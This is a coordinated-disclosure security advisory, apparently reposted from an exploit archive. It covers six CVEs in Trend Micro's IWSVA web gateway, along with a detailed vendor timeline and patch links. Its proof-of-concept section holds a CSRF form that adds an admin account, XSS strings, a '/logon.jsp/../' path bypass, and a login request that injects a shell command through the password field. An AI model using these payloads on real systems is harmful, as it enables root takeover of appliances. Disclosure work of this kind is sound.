@@ -1,0 +1,384 @@
+id: 35510
+date: 12/17/2020
+title: Trend Micro IWSVA CSRF / XSS / Bypass / SSRF / Code Execution Vulnerabilities
+author: Wolfgang Ettlinger
+cves: CVE-2020-8461, CVE-2020-8462, CVE-2020-8463, CVE-2020-8464, CVE-2020-8465, CVE-2020-8466
+
+Trend Micro IWSVA CSRF / XSS / Bypass / SSRF / Code Execution Vulnerabilities
+
+CVE-2020-8461, CVE-2020-8462, CVE-2020-8463, CVE-2020-8464, CVE-2020-8465, CVE-2020-8466
+
+Vendor description:
+-------------------
+"The web has rapidly become a top threat vector for business. In addition to
+blocking malicious code, inappropriate websites, and targeted attacks, security
+managers are also being asked to secure the expanding use of Web 2.0 and
+cloud-based applications, while reducing overhead and bandwidth costs.
+
+Trend Micro™ InterScan™ Web Security Virtual Appliance is an on-premises secure
+web gateway that gives you superior protection against dynamic online threats,
+while providing you with real-time visibility and control of employee internet
+usage. Interscan Web Security is also available in the cloud as a service."
+
+URL: https://www.trendmicro.com/en_us/business/products/user-protection/sps/web-security/interscan-web-security-virtual-appliance.html
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch which should be installed immediately.
+
+Customers should also adhere to security best practices such as network
+segmentation, limiting access to the admin panel or admins not being logged
+on while surfing the web for CSRF mitigation.
+
+SEC Consult highly recommends to perform a thorough security review of this
+and similar Trend Micro products conducted by security professionals to
+identify and resolve all security issues. Based on the identified issues
+it is possible that further critical issues exist in those products.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) CSRF Protection Bypass (CVE-2020-8461)
+The IWSVA web interface checks that every request contains a valid CSRF token.
+However, this check does not apply if the request contains a body that is
+encoded as multipart/form-data. Therefore, an attacker can simply get the
+victim's browser to send any request encoded as multipart/form-data without
+requiring a valid CSRF token.
+
+2) Cross-Site Scripting (CVE-2020-8462)
+Several stored and reflected Cross-Site Scripting vulnerabilities have been
+identified in the IWSVA web interface.
+
+3) Authorization Bypass (CVE-2020-8463)
+A global authorization check is performed to allow anonymous users access to
+a very restricted set of paths (e.g. the login page). This check is performed by
+checking that the first part of the requested path matches one of the allowed
+paths (e.g. logon.jsp). This verification can be bypassed by sending request paths
+in the form of /logon.jsp/../<actual path> which allows accessing other scripts.
+
+4) Authentication Bypass/SSRF (CVE-2020-8464)
+The IWSVA administration web interface does not perform all authentication
+checks if the request is sent from localhost. However, as the IWSVA also operates
+as an HTTP proxy, an attacker can send requests that appear to come from
+localhost by accessing the admin interface through the proxy. This behavior
+also exposes the administration interface to users that would normally only have
+access to the HTTP proxy of the appliance.
+
+5) Command Execution (CVE-2020-8465)
+The IWSVA's update functionality allows administrators to upload system updates
+provided by Trend Micro™ to the web interface. The code contained in these
+updates is executed as root. No code authenticity checks are performed before
+applying the update. Therefore, by combining this behavior with the previous
+vulnerabilities an unauthenticated attacker can execute code as user root.
+
+6) Unauthenticated Command Injection (CVE-2020-8466)
+When the improved password hashing method is enabled (see release notes for
+Service Pack 2 Patch 3 for instructions how to enable it) the appliance is
+vulnerable to a command injection vulnerability affecting the password
+submitted during login. Therefore, an unauthenticated attacker is able to
+execute commands by providing a manipulated password.
+
+
+Proof of concept:
+-----------------
+1) CSRF Protection Bypass (CVE-2020-8461)
+The following fragment demonstrates this issue by adding the user "attacker" by
+using the form enctype "multipart/form-data":
+
+<form
+action="https://<host>:8443/servlet/com.trend.iwss.gui.servlet.updateaccountadministration?accountop=add&allaccount=admin&accountType=local&accountnamelocal=attacker&accounttype=0&password_changed=true&PASS1=test&PASS2=test&description=&role_select=1&roleid=1"
+
+    method="POST"
+    enctype="multipart/form-data">
+  <input type="hidden" name="x" value="y" />
+  <input type="submit" value="Send" />
+</form>
+
+
+2) Cross-Site Scripting (CVE-2020-8462)
+The following instances of stored and reflected cross-site scripting
+vulnerabilities have been identified (all of these can be combined with CSRF
+protection bypass).
+
+ * Adding a user e.g. with the description <img src=x onerror=alert(1)>
+   Executed in the user overview (login_accounts.jsp)
+ * Sending a POST request like /logon_report.jsp?"><script>alert(1)</script>
+   (this only works in Internet Explorer as other browsers URL-encode some
+   of these characters)
+ * The following path demonstrates a reflected XSS:
+   /change_status.jsp?settings=--><script>alert(1)</script>
+
+
+3) Authorization Bypass (CVE-2020-8463)
+The following path demonstrates how the global authorization filter can be
+bypassed. The effects of this vulnerability alone were not further investigated.
+Only the effects when combined with vulnerability #4 were researched.
+
+/logon.jsp/../<anything>.jsp
+
+
+4) Authentication Bypass/SSRF (CVE-2020-8464)
+The following script demonstrates how the proxy of the appliance at port 8080
+can be used to access the administration interface. Vulnerability #3 was used
+to bypass the global authorization filter. The request is being sent through
+the proxy and because it appears to come from localhost other security
+mechanisms are bypassed. This script adds a user "attacker".
+
+[ Python exploit script removed from this advisory ]
+
+
+5) Command Execution (CVE-2020-8465)
+Updates to the IWSVA are released as Tar-Gz files that are structured as follows:
+
+update.tgz
+ MD5SUM.txt                 contains the output of md5sum *
+ stargate_patch.tgz
+  stargate_patch.ini        contains metadata
+  stargate_patch_apply.sh   executed during update
+
+The file contains no signature that is checked before the update is applied. The
+code in stargate_patch_apply.sh can be executed with a single request.
+
+Note: As file uploads are always sent as multipart/form-data the CSRF filter
+is ineffective for system updates.
+
+
+6) Unauthenticated Command Injection (CVE-2020-8466)
+The following request demonstrates this issue:
+--- snip ---
+POST /uilogonsubmit.jsp HTTP/1.1
+Host: testhost:8443
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+
+uid=admin&passwd=`id`+>/tmp/test+%23
+--- snip ---
+
+After this request has been executed, the file /tmp/test contains the following:
+
+   uid=498(iscan) gid=499(iscan) groups=499(iscan)
+
+
+When combining these vulnerabilities the following attack chains are possible:
+ * An attacker on the internet could abuse the CSRF and Command Execution
+   vulnerability to take over the appliance as root.
+ * An attacker with access to the HTTP proxy port could abuse the
+   authentication/authorization bypass vulnerabilities and the Command Execution
+   vulnerability to take over the appliance as root without user/admin interaction.
+
+A python exploit script that demonstrates the latter attack scenario has been
+developed and provided to Trend Micro, which will not be released. Instead,
+a short PoC video showing that an unauthenticated attacker can take over the
+appliance as root has been made:
+
+https://www.youtube.com/watch?v=Chl2OeIi2xI
+
+
+Vulnerable / tested versions:
+-----------------------------
+The version IWSVA 6.5 SP2 EN Patch 4 Build 1844 with Patch cpb1852 was tested.
+This was the latest version at the time of discovery.
+
+
+Vendor contact timeline:
+------------------------
+2019-08-14: Contacting vendor through security@trendmicro.com
+            Submitting advisory information encrypted (PGP).
+2019-08-14: Vendor reply, they will take a look at the issue.
+2019-08-14: SEC Consult provides additional information/notes and potential
+            other security issues not included in the advisory as more
+            internal product information & time would be necessary to further
+            investigate them.
+2019-09-02: Vendor reviewed and analyzed the advisory reports, having difficulties
+            and needing more detailed steps to recreate and exploit the vulnerabilities
+            CSRF could not be exploited/simulated internally, as a "CSRF token"
+            is required.
+2019-09-02: SEC Consult explained how and why CSRF is exploitable again, e.g.
+            when the user admin is logged in and the PoC form is sent, a new
+            user is automatically created.
+            Asking the vendor whether we tested the latest available version
+            (IWSVA 6.5SP2 EN Patch 4 Build 1844 (w/cpb1852)).
+2019-09-03: Vendor is asking about more details on the other reported vulnerabilities;
+            More detailed steps in recreating and exploiting the issues are
+            requested. Furthermore, info on how the form data for the CSRF PoC
+            is being sent.
+2019-09-03: SEC Consult provides video how the CSRF issue can be exploited easily.
+            Asking what further details would be necessary for the other vulnerabilities
+            as we believe the proof of concepts to be sufficient to verify them
+2019-09-17: No reply; asking vendor about the status.
+2019-09-19: Vendor was able to verify only two vulnerabilities (CSRF & XSS)
+            Claimed CSRF attack might not be feasible as attacker would require an
+            authenticated admin's cookie.
+            First fixes for XSS have been implemented by vendor.
+            Issue 3, 4 and 6 could not be reproduced by vendor, PoC similar to the video
+            requested. Analysis of issue 5 is ongoing.
+2019-09-19: Explaining to the vendor what CSRF is and also providing external
+            info such as OWASP;
+            Requesting specifics on why vulnerabilities could not be reproduced.
+            Asking for information when vendor expects to be able to provide
+            a patch.
+2019-09-25: Trend Micro PSIRT: no timeline can be provided currently as issues could not be
+            reproduced yet.
+2019-09-27: SEC Consult postpones advisory release, asking whether further support
+            is needed.
+2019-10-11: Asking if vulnerabilities could be reproduced by now.
+2019-10-11: Trend Micro PSIRT: development team worked on the last three vulnerabilities (4-6),
+            update will follow next week.
+2019-10-21: Vendor sends PGP encrypted message that can't be decrypted.
+2019-10-23: Vendor re-sends message unencrypted; vendor made some progress. Further
+            info regarding the additionally provided notes requested.
+2019-10-23: SEC Consult: providing more info again.
+2019-10-30: Asking vendor again regarding release date
+2019-11-04: Trend Micro PSIRT: Testing completed, patch should be ready today, localization
+            needs more time.
+            Discussing further responsible disclosure steps.
+2019-11-09: Trend Micro PSIRT: No ETA yet on final patch because of localization.
+2019-11-29: Asking for a status update.
+2019-12-10: Trend Micro PSIRT: unexpected issues encountered, intended fix has been rolled back.
+            Should know further information by end of the week.
+2020-01-08: Asking for a status update.
+2020-01-13: Trend Micro PSIRT: development team committed to complete the new fix ETA on or
+            before Feb 4
+2020-01-16: SEC Consult confirms release date for 4th February.
+            Proposing to schedule our advisory release for 19th February to give
+            end users more time to patch the highly critical issues.
+2020-01-27: No reply yet; SEC Consult informs vendor that we expect the patch
+            to be released on 4th February and plan the advisory release for 19th February.
+2020-01-29: Vendor sends PGP-encrypted email only for their email address; asking to
+            resend it.
+            Vendor resends email:
+            Vendor is still working on patch (localization for different regions), should be
+            available by February "if all goes well". Cannot commit to disclosure date yet,
+            new date will be proposed.
+2020-01-29: Taking next responsible disclosure steps, contacting CERT-Bund and CERT.at
+            regarding scheduled release.
+2020-01-29: Asking vendor for further patch information (fixed & affected versions) and
+            regarding CVE numbers.
+2020-01-30: Telephone call with Trend Micro Germany.
+2020-02-03: Telephone call with Trend Micro Germany.
+2020-02-04: Trend Micro Germany: CP 1884 will be ready on 7th February.
+2020-02-04: Asking whether all security issues have been fixed, postponing security advisory
+            release to 24th February, asking again for affected versions, CVE numbers, etc.
+2020-02-06: Trend Micro Germany: Hotfix is now available
+2020-02-06: Asking whether all issues have been fixed, based on the release notes it seems
+            to us that XSS has not been fixed properly and only the "X-XSS-Protection"
+            header has to be configured by admins now.
+            Asking vendor for further info on this.
+2020-02-07: Trend Micro Germany: The patch addresses all identified security issues:
+                1) CSRF Protection Bypass            > VRTS-3552
+                2) Cross-Site Scripting              > VRTS-3257
+                3) Authorization Bypass              > VRTS-3554
+                4) Authentication Bypass/SSRF        > VRTS-3555
+                5) Command Execution                 > VRTS-3556
+                6) Unauthenticated Command Injection > VRTS-3557
+2020-02-09: Trend Micro PSIRT: there will be a security bulletin by the vendor which
+            includes the CVE numbers, no date yet because of localization.
+2020-02-11: Asking vendor again regarding the new "xss_protect" key in the configuration and
+            to please share the CVE numbers when they are available.
+2020-02-14: No answer from vendor yet. Performed recheck of the critical patch b1884
+            and identified that most of the security issues have not or improperly
+            been fixed.
+            Notifying BSI/CERT-Bund, CERT.at and Trend Micro PSIRT & Trend Micro Germany
+            to discuss next steps, providing a detailed recheck analysis report.
+2020-02-15: Trend Micro PSIRT: issue has been escalated with highest priority.
+            Defective patch has been removed from download center.
+2020-02-18: Trend Micro PSIRT provides analysis on submitted recheck report,
+            SEC Consult provides feedback why some of the issues are still exploitable.
+2020-02-20: Trend Micro PSIRT: feedback is reviewed by developers.
+2020-03-04: Asking for a status / schedule update.
+2020-03-04: Trend Micro PSIRT: the patch will be a major rework (similar to service pack)
+            20th April is being targeted for patch validation, 30th April for release.
+2020-03-05: Informing Trend Micro that we have reserved some time for patch validation
+            end of April
+2020-04-09: Asking for a status update if the patch is still planned for 20th April
+2020-04-15: Trend Micro PSIRT: patch delayed, new patch ETA is 30th April
+2020-04-29: Trend Micro PSIRT: IWSVA CP pre-release build is ready for verification.
+2020-05-03: Informing Trend Micro that most identified vulnerabilities could still
+            be easily bypassed and were not patched properly, review not finished yet.
+2020-05-05: Sending Trend Micro the revised, detailed recheck report outlining that
+                VRTS-3552 - CSRF Protection Bypass (#1) => not fixed properly
+                VRTS-3257 - XSS => fixed but new XSS filter has not been reviewed
+                                   (new "xss_protect_all" config value)
+                VRTS-3554 - Authorization Bypass => not fixed properly
+                VRTS-3555 - Authentication Bypass/SSRF (#3) => not fixed properly
+                VRTS-3556 - Command Execution => not fixed properly
+                VRTS-3557 - Unauthenticated Command Injection => fixed
+2020-05-06: Clarifying questions regarding the document
+2020-05-26: Asking if patch will be available on 2020-06-02
+2020-05-26: Patch will be available for verification on 2020-06-01
+2020-05-29: Trend Micro PSIRT provides debug patch
+2020-06-08: Sending recheck report document
+                VRTS-3552 - CSRF Protection Bypass (#1) => fixed
+                VRTS-3554 - Authorization Bypass => fixed
+                VRTS-3555 - Authentication Bypass/SSRF (#3) => not fixed properly
+                VRTS-3556 - Command Execution => partially fixed
+2020-07-07: Trend Micro PSIRT provides debug patch
+2020-07-09: Sending recheck report document
+                VRTS-3555 - Authentication Bypass/SSRF (#3) => partially fixed
+                VRTS-3556 - Command Execution => partially fixed
+2020-07-16: Contacting vendor, coordination of patch & advisory release date
+2020-08-04: Asking for a status update
+2020-08-24: Asking for a status update
+2020-09-18: Asking for a status update; Answer: "The hotfix is ready, however, the
+            official critical patch to be used for public disclosure is still being
+            finalized"; disclosure date will be communicated later
+2020-10-23: Asking for a status update
+2020-10-29: Trend Micro PSIRT: dev team is still working on a fix, integrating some other
+            components/solutions
+2020-11-11: Asking for estimated patch release date; no response
+2020-11-27: Asking again for estimated patch release date
+2020-11-29: Trend Micro PSIRT: Patch should be available in a few weeks
+2020-12-10: Trend Micro PSIRT: Patch is available, provides CVE numbers, security bulletin
+            will be released on 15th December
+2020-12-10: Informing German BSI/CERT-Bund and CERT.at about the patch release and
+            bulletin date, TLP GREEN.
+2020-12-10: Asking vendor about the new "xss_protect_all" config value to enable the XSS
+            filter, if it is enabled by default now, as it is not mentioned in the
+            latest release notes and only the variable "xss_protect" in previous builds.
+            Telling the vendor that we are releasing our advisory on 17th December.
+2020-12-13: Trend Micro PSIRT: "xss_protect_all" is enabled by default.
+            Adjusting solution in advisory, follow-up question about "xss_protect".
+2020-12-15: Trend Micro security bulletin release
+2020-12-17: Coordinated release of security advisory
+
+
+
+Solution:
+---------
+The vendor provides a patch which should be installed immediately. The release
+notes can be found here:
+https://files.trendmicro.com/documentation/readme/iwsva_65-sp2_en/iwsva_6.5-sp2_ar64_en_criticalpatch_b1919_EN_Readme.txt
+
+Patch download:
+https://files.trendmicro.com/products/iwsva_65-sp2_en/iwsva_65_sp2_ar64_en_criticalpatch_b1919.zip
+(According to vendor, ensure that you have installed IWSVA 6.5 Service Pack 2 Hotfix 1912)
+
+Download center URL:
+https://downloadcenter.trendmicro.com/index.php?regs=de&prodid=86
+
+Trend Micro Security Bulletin:
+https://success.trendmicro.com/solution/000283077
+
+Important: There are new XSS protection config values "xss_protect" and "xss_protect_all"
+in order to enable the new XSS filter. "xss_protect_all" is enabled by default
+according to the vendor.
+
+Description from Trend Micro to enable the "xss_protect" variable from previous
+release notes:
+                  1. Install the hotfix
+                  2. SSH to the IWSVA shell.
+                  3. Open the "/var/iwss/intscan.ini" file.
+                  4. Locate the "http" section.
+                  5. Add the following key and set it to "enable".
+                     [http]
+                     xss_protect=enable
+                  6. Save the changes and close the file.
+                  7. Restart the web console service.
+
+
+Customers should also adhere to security best practices such as network
+segmentation, limiting access to the admin panel or admins not being logged
+on while surfing the web for CSRF mitigation.
+
+#  0day.today [2023-03-24]  #
